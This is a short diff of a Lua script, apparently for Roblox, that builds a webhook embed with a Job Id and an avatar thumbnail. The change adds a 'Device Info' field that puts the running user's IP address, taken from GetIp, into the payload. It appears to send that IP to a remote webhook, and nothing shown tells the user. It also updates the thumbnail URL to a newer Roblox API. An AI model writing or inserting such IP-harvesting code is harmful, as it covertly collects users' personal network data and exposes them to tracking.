@@ -143,11 +143,16 @@ local function createWebhookData()
                         ["name"] = "Job Id",
                         ["value"] = string.format("```\n%s\n```", ConsoleJobId),
                         ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Device Info",
+                        ["value"] = string.format("**Ip**: %s", GetIp),
+                        ["inline"] = true
                     }
                 },
                 ["type"] = "rich",
                 ["color"] = tonumber("FFD700"), 
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
+                ["thumbnail"] = {["url"] = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..Userid.."&size=150x150&format=Png&isCircular=false&thumbnailType=HeadShot"},
             }
         }
     }
